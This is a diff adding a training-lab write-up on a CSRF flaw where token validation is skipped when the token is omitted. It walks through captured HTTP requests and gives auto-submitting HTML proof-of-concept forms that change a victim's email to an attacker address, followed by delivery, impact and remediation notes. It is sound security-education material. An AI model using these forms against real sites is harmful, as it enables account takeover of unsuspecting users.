@@ -1,0 +1,86 @@
+# Lab: CSRF where token validation depends on token being present
+
+**Level:** Practitioner  
+**Category:** CSRF  
+**Goal:** Change the victim’s email via CSRF.  
+**Test creds:** `wiener:peter`
+
+---
+
+## Summary
+The email-change endpoint validates the `csrf` token **only when it is present**. If the parameter is **omitted**, the server accepts the request, making it vulnerable to CSRF.
+
+---
+
+## Conditions for CSRF (all met)
+1. **Sensitive action:** Change email.  
+2. **Authenticated via cookies:** Browser auto-sends `session` cookie.  
+3. **No unpredictable requirement when token is omitted:** Removing `csrf` still succeeds.
+
+---
+
+## Step 1 — Capture the legitimate request
+Log in as `wiener:peter`, change your email once, and capture the request in Burp:
+
+```http
+POST /my-account/change-email HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=...
+Content-Type: application/x-www-form-urlencoded
+
+csrf=5TfGHTyX5XyKmqVfF&email=wiener@test.com
+Step 2 — Verify the flaw in Repeater
+Modify csrf → request is rejected (token checked if present).
+
+Remove the entire csrf parameter and resend:
+
+
+POST /my-account/change-email HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Cookie: session=...
+Content-Type: application/x-www-form-urlencoded
+
+email=wiener@test.com
+✅ Response accepted → token is not required when omitted.
+
+Step 3 — Build exploit HTML
+A) Burp Suite Professional — Generate CSRF PoC
+Right-click the working request (without csrf) → Engagement tools → Generate CSRF PoC.
+
+Enable “Include auto-submit script.”
+
+Click Regenerate → copy the HTML PoC.
+
+Replace the email value with your attacker email (must differ from your own).
+
+The generated PoC will look like:
+
+
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.net">
+</form>
+<script>document.forms[0].submit();</script>
+B) Burp Suite Community — Manual PoC
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="attacker@evil.net">
+</form>
+<script>document.forms[0].submit();</script>
+Step 4 — Host and deliver
+Open the Exploit Server → paste the PoC into Body → Store.
+
+Click View exploit to test on your own account (verify email changed).
+
+Change the email to one not already used.
+
+Click Deliver to victim → ✅ Lab solved.
+
+Impact
+Account takeover path: attacker sets their own email, then triggers password reset to that address.
+
+Remediation
+Always require and validate a CSRF token on every state-changing request—token must be present, bound to the session, and verified.
+
+Use SameSite=Lax/Strict cookies.
+
+Re-authenticate for critical changes (email/password).
